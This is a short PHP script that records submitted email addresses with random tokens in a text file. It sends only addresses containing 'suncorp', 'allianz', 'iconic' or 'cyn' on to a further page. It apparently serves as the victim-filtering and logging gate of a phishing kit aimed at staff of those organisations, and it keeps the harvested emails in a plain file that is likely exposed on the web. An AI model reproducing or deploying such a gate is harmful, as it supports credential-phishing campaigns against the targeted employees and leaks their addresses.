<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $lowercaseEmail = strtolower($email);
    $keywords = array("suncorp", "allianz", "iconic", "cyn");
    $hasKeyword = false;

    // Check if the email contains any of the keywords
    foreach ($keywords as $keyword) {
        if (stripos($lowercaseEmail, $keyword) !== false) {
            $hasKeyword = true;
            break;
        }
    }

    // Generate a verification token
    $token = bin2hex(random_bytes(16));

    // Store the email and token in a text file
    file_put_contents("emails.txt", $email . ":" . $token . PHP_EOL, FILE_APPEND);

    // Redirect based on conditions
    if ($hasKeyword) {
        header("Location: cyncv.html?email=" . urlencode($email) . "&token=" . urlencode($token));
        exit();
    } else {
        header("Location: noaccess.html");
        exit();
    }
}
?>
